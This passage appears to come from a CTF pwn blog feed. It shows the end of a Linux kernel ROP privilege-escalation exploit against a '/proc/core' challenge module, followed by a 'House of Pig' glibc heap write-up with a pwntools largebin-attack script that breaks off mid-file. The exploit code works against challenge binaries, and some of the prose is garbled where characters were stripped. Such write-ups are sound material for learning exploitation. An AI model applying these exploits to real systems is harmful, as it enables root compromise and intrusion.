shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> +bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff8106a6d2: mov rdi, rax; jmp rdx; </span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  save_status();</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81000b2f</span> + bias; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = prepare_kernel_cred;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff810a0f49</span> + bias; <span class="comment">// pop rdx; ret</span></span><br><span class="line">  rop[i++] = commit_creds;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff8106a6d2</span> + bias;<span class="comment">//mov rdi, rax; jmp rdx; </span></span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span>+bias;  <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell; <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/14/kernel-rop/image-20230816174130879.png" alt="image-20230816174130879"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Pig</title>
      <link href="/2023/08/12/house-of-pig/"/>
      <url>/2023/08/12/house-of-pig/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/01dwang/house_of_pig">https://github.com/01dwang/house_of_pig</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubantu20 ~/s/c/p/h/h/pig [2]&gt; checksec ./pig</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/ctfwiki/pwn/heap/house_of_pig-main/pig/pig&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PIG</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *des_ptr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> des_size[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> des_exist_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> freed_sign[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ALL_PIGS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *peppa_des_ptr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> peppa_des_size[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> peppa_des_exist_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> peppa_freed_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> peppa_last_size;</span><br><span class="line">  <span class="type">int</span> align1;</span><br><span class="line">  <span class="type">char</span> *mummy_des_ptr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> mummy_des_size[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> mummy_des_exist_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> mummy_freed_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> mummy_last_size;</span><br><span class="line">  <span class="type">int</span> align2;</span><br><span class="line">  <span class="type">char</span> *daddy_des_ptr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> daddy_des_size[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> daddy_des_exist_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> daddy_freed_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> daddy_last_size;</span><br><span class="line">  <span class="type">int</span> view_times_left;</span><br><span class="line">  <span class="type">int</span> edit_times_left;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>200x90&lt;&#x3D;&lt;&#x3D;0x430+ 28</p><p>Change rolesmd5</p><p><strong>md5</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">init_v5</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_DWORD *)a1 = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">2</span>) = <span class="number">0x67452301</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">3</span>) = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">4</span>) = <span class="number">0x98BADCFE</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">5</span>) = <span class="number">0x10325476</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5strcmp00md5&lt;D\x00</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">head = <span class="string">&quot;3c4400&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">    s=<span class="string">b&#x27;A&#x27;</span>+<span class="built_in">str</span>(i).encode()</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(s).hexdigest().startswith(head):</span><br><span class="line">      <span class="built_in">print</span>(s)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">A26535034</span></span><br><span class="line"><span class="string">B3332073</span></span><br><span class="line"><span class="string">C75929410</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>des_exist_sign</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_3B3E</span><span class="params">(PIG *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(mmap_0, a1, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(mmap_0-&gt;peppa_des_size, a1-&gt;des_size, <span class="keyword">sizeof</span>(mmap_0-&gt;peppa_des_size));</span><br><span class="line">  <span class="built_in">memcpy</span>(mmap_0-&gt;peppa_freed_sign, a1-&gt;freed_sign, <span class="keyword">sizeof</span>(mmap_0-&gt;peppa_freed_sign));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit viewdes_exist_sign0des_exist_signdelteuaf</p><h3 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO_FILE"></a>IO_FILE</h3><p> libc 2.24  vtable glibc  vtable  _IO_jump_t vtable  _IO_str_jumps  check exit_exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_str_overflow</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"> </span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line">new_size=<span class="number">2</span> * ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) + <span class="number">100</span></span><br></pre></td></tr></table></figure><p></p><ul><li>fp-&gt;_flags&#x3D;0 </li><li>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;&#x3D; _IO_buf_end - _IO_buf_base</li></ul><p>_malloc (new_size) -&gt; memset (new_buf + old_blen, \0, new_size - old_blen); -&gt; free (old_buf);_IO_buf_end_IO_buf_basemalloc</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pig&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size: &quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;message: &quot;</span>,(payload+<span class="string">b&#x27;\n&#x27;</span>)*(size//<span class="number">48</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Edit</span>(<span class="params">idx,payload</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;message: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Del</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Change</span>(<span class="params">role</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (role == <span class="number">1</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;user:\n&quot;</span>,<span class="string">b&quot;A\x01\x95\xc9\x1c&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (role == <span class="number">2</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;user:\n&quot;</span>,<span class="string">b&quot;B\x01\x87\xc3\x19&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (role == <span class="number">3</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;user:\n&quot;</span>,<span class="string">b&quot;C\x01\xf7\x3c\x32&quot;</span>)</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    Add(<span class="number">0x90</span>,<span class="string">b&#x27;tcache size&#x27;</span>) <span class="comment"># B0~B4</span></span><br><span class="line">    Del(x)  <span class="comment"># B0~B4</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x150</span>, <span class="string">b&#x27;tcache size\n&#x27;</span>) <span class="comment"># A0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x150</span>, <span class="string">b&#x27;tcache size\n&#x27;</span>) <span class="comment"># A1~A7</span></span><br><span class="line">    Del(<span class="number">1</span>+x)<span class="comment"># A1~A7</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 0x150A0unsortedbin</span></span><br><span class="line">Del(<span class="number">0</span>)<span class="comment"># A0</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#A00xa0unsorted</span></span><br><span class="line">Add(<span class="number">0xb0</span>,<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># B5</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#0xa0smallbin</span></span><br><span class="line">Add(<span class="number">0x180</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A8</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x180</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A9~A15</span></span><br><span class="line">    Del(<span class="number">9</span>+x)</span><br><span class="line"><span class="comment">#A8unsortedbind</span></span><br><span class="line">Del(<span class="number">8</span>)<span class="comment">#A8</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#A8unsortedbin0xa0</span></span><br><span class="line">Add(<span class="number">0xe0</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x8</span>)<span class="comment"># B6</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#a0smallbin</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>)<span class="comment"># A16</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#a16topchunk  </span></span><br><span class="line">Add(<span class="number">0xf0</span>, <span class="string">b&#x27;B\n&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># B7</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#A16unsortedbin</span></span><br><span class="line">Del(<span class="number">16</span>)</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#a16largebin</span></span><br><span class="line">Add(<span class="number">0x440</span>, <span class="string">b&#x27;B\n&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># B8</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;message is: &#x27;</span>)</span><br><span class="line">libc_base = uu64(r(<span class="number">6</span>))-<span class="number">0x1ecfe0</span></span><br><span class="line">free_hook = libc_base + libcelf.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libcelf.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">Edit(<span class="number">16</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">b&#x27;message is: &#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = uu64(r(<span class="number">6</span>)) - <span class="number">0x13940</span></span><br><span class="line">p(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- first largebin_attack</span></span><br><span class="line"><span class="comment">#A16fdbk</span></span><br><span class="line">Edit(<span class="number">16</span>, <span class="number">2</span>*p64(libc_base+<span class="number">0x1ecfe0</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A17</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A18</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A19</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#B8 0x440unsortedbin</span></span><br><span class="line">Del(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#B8 0x440largebin</span></span><br><span class="line">Add(<span class="number">0x450</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># B9</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#A17unsortedbin</span></span><br><span class="line">Del(<span class="number">17</span>)</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#B8fd_nextsizebk_nextsize mompig0x10</span></span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(free_hook-<span class="number">0x28</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#largebin attachvictim-&gt;bk_nextsize-&gt;fd_nextsize = victim; free_hook-0x28+0x20</span></span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># C0</span></span><br><span class="line">b()</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span 